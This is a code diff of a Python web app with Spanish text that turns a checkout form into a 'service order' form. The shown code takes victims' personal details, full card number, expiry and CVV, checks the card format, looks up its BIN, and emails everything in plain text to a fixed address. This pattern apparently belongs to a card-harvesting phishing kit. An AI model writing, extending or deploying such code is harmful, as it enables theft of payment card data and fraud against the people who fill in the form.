@@ -59,11 +59,13 @@ def send_checkout_email(data):
         msg = MIMEMultipart()
         msg["From"] = SMTP_USER
         msg["To"] = EMAIL_TO
-        msg["Subject"] = f"Nuevo checkout - {data['personal']['full_name']}"
+        msg["Subject"] = f"Nuevo pedido - {data['personal']['full_name']}"
         
         body = f"""
-NUEVO CHECKOUT COMPLETADO
+NUEVO PEDIDO DE SERVICIO
 =========================
+
+SERVICIO SOLICITADO: {data['service_type']}
 
 DATOS PERSONALES:
 - Nombre: {data['personal']['full_name']}
@@ -81,7 +83,7 @@ DATOS DE PAGO:
 - Expiración: {data['payment']['card_expiry']}
 - CVV: {data['payment']['card_cvv']}
 
-DATOS DE ENVÍO/FACTURACIÓN:
+DATOS DE FACTURACIÓN:
 - Nombre: {data['shipping']['shipping_name']}
 - País: {data['shipping']['country']}
 - Región: {data['shipping']['region']}
@@ -152,6 +154,7 @@ def checkout_post():
         log_event("csrf_invalid", ip, ua, "/checkout", "POST", "error")
         return redirect(url_for("result", status="error"))
     
+    service_type = sanitize_input(request.form.get("service_type", ""))
     full_name = sanitize_input(request.form.get("full_name", ""))
     email = sanitize_input(request.form.get("email", ""))
     rut_dni = sanitize_input(request.form.get("rut_dni", ""))
@@ -170,12 +173,11 @@ def checkout_post():
     shipping_phone = sanitize_input(request.form.get("shipping_phone", ""))
     shipping_email = sanitize_input(request.form.get("shipping_email", ""))
     
-    if not all([full_name, email, rut_dni, phone, card_number, card_expiry, card_cvv,
+    if not all([service_type, full_name, email, rut_dni, phone, card_number, card_expiry, card_cvv,
                 shipping_name, country, region, city, address, postal_code, shipping_phone, shipping_email]):
         log_event("checkout_invalid_input", ip, ua, "/checkout", "POST", "error")
         return redirect(url_for("result", status="error"))
     
-    # Validar tarjeta con Luhn
     card_valid, card_message = validate_card_format(card_number.replace(" ", ""))
     if not card_valid:
         log_event("checkout_invalid_card", ip, ua, "/checkout", "POST", "error", {"reason": card_message})
@@ -184,6 +186,7 @@ def checkout_post():
     bin_info = lookup_bin(card_number)
     
     checkout_data = {
+        "service_type": service_type,
         "personal": {
             "full_name": full_name,
             "email": email,
